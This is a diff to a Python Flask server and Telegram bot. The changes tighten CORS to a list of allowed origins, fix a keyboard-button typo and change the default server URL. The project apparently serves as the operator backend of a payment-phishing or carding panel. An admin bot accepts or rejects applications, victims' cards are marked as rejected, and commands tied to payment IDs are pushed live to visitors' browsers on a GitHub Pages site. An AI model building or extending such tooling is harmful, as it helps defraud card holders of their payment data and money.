@@ -1,3 +1,4 @@
+
 import asyncio
 import logging
 import os
@@ -41,18 +42,34 @@ app = Flask(__name__)
 sse_clients = {}
 sse_lock = Lock()
 
+# Разрешенные домены для CORS (GitHub Pages + локальная разработка)
+ALLOWED_ORIGINS = [
+    "https://vbivchik.github.io",  # Ваш GitHub Pages
+    "http://localhost:3000",
+    "http://127.0.0.1:5500",
+    "http://localhost:8080",
+    "http://127.0.0.1:8080",
+    "https://roomixvbiv.up.railway.app"  # Ваш Railway домен
+]
+
 # CORS middleware
 @app.after_request
 def after_request(response):
-    response.headers['Access-Control-Allow-Origin'] = '*'
-    response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
-    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
+    origin = request.headers.get('Origin')
+    if origin in ALLOWED_ORIGINS:
+        response.headers['Access-Control-Allow-Origin'] = origin
+    response.headers['Access-Control-Allow-Headers'] = 'Content-Type, *'
+    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS'
+    response.headers['Access-Control-Allow-Credentials'] = 'true'
     return response
 
 @app.route('/sse/<user_id>')
 def sse(user_id):
     """Server-Sent Events endpoint для получения команд"""
     def event_stream():
+        # Добавляем CORS headers для SSE
+        yield f"data: {json.dumps({'type': 'connected', 'message': 'SSE подключен'})}\n\n"
+        
         # Регистрируем клиента
         with sse_lock:
             if user_id not in sse_clients:
@@ -78,13 +95,24 @@ def sse(user_id):
                     del sse_clients[user_id]
                     logger.info(f"❌ SSE отключен: {user_id}")
 
-    return Response(event_stream(), mimetype='text/event-stream')
+    response = Response(event_stream(), mimetype='text/event-stream')
+    origin = request.headers.get('Origin')
+    if origin in ALLOWED_ORIGINS:
+        response.headers['Access-Control-Allow-Origin'] = origin
+    response.headers['Access-Control-Allow-Credentials'] = 'true'
+    return response
 
 @app.route('/send_command', methods=['POST', 'OPTIONS'])
 def send_command():
     """Бот отправляет команду пользователю"""
     if request.method == 'OPTIONS':
-        return '', 200
+        response = jsonify({'status': 'ok'})
+        origin = request.headers.get('Origin')
+        if origin in ALLOWED_ORIGINS:
+            response.headers['Access-Control-Allow-Origin'] = origin
+        response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
+        response.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
+        return response
         
     try:
         data = request.json
@@ -108,11 +136,19 @@ def send_command():
             sse_clients[user_id].append(command_data)
             
         logger.info(f"✅ Команда отправлена {user_id}: {action}")
-        return {'status': 'success'}
+        response = jsonify({'status': 'success'})
+        origin = request.headers.get('Origin')
+        if origin in ALLOWED_ORIGINS:
+            response.headers['Access-Control-Allow-Origin'] = origin
+        return response
         
     except Exception as e:
         logger.error(f"❌ Ошибка отправки команды: {e}")
-        return {'error': str(e)}, 500
+        response = jsonify({'error': str(e)})
+        origin = request.headers.get('Origin')
+        if origin in ALLOWED_ORIGINS:
+            response.headers['Access-Control-Allow-Origin'] = origin
+        return response, 500
 
 @app.route('/health')
 def health():
@@ -121,12 +157,17 @@ def health():
         users_count = len(sse_clients)
         total_commands = sum(len(commands) for commands in sse_clients.values())
     
-    return {
+    response = jsonify({
         'status': 'running',
         'users_count': users_count,
         'total_commands': total_commands,
-        'timestamp': datetime.datetime.now().isoformat()
-    }
+        'timestamp': datetime.datetime.now().isoformat(),
+        'allowed_origins': ALLOWED_ORIGINS
+    })
+    origin = request.headers.get('Origin')
+    if origin in ALLOWED_ORIGINS:
+        response.headers['Access-Control-Allow-Origin'] = origin
+    return response
 
 @app.route('/')
 def home():
@@ -136,6 +177,7 @@ def run_flask():
     """Запуск Flask сервера в отдельном потоке"""
     try:
         port = int(os.environ.get('PORT', 8080))
+        logger.info(f"🌐 Flask запускается на порту: {port}")
         app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
     except Exception as e:
         logger.error(f"💥 Ошибка запуска Flask: {e}")
@@ -227,7 +269,7 @@ def get_admin_buttons(application_id):
     return InlineKeyboardMarkup(inline_keyboard=[
         [
             InlineKeyboardButton(text="✅ Принять", callback_data=f"accept_{application_id}"),
-            InlineboardingButton(text="❌ Отклонить", callback_data=f"reject_{application_id}")
+            InlineKeyboardButton(text="❌ Отклонить", callback_data=f"reject_{application_id}")
         ]
     ])
 
@@ -295,7 +337,7 @@ async def send_sse_command(user_id, action_type, payment_id=None):
         import requests
         
         # Получаем URL сервера
-        server_url = os.environ.get('RAILWAY_STATIC_URL', 'http://localhost:8080')
+        server_url = os.environ.get('RAILWAY_STATIC_URL', 'https://roomixvbiv.up.railway.app')
         
         response = requests.post(
             f"{server_url}/send_command",
@@ -429,7 +471,7 @@ async def wrong_card_handler(callback: types.CallbackQuery):
     )
     await callback.answer("Карта отклонена")
 
-# Обработчики для бота (остальной код без изменений)
+# Остальные обработчики бота (без изменений)
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message):
     if message.chat.id == ADMIN_CHAT_ID:
@@ -833,3 +875,4 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+
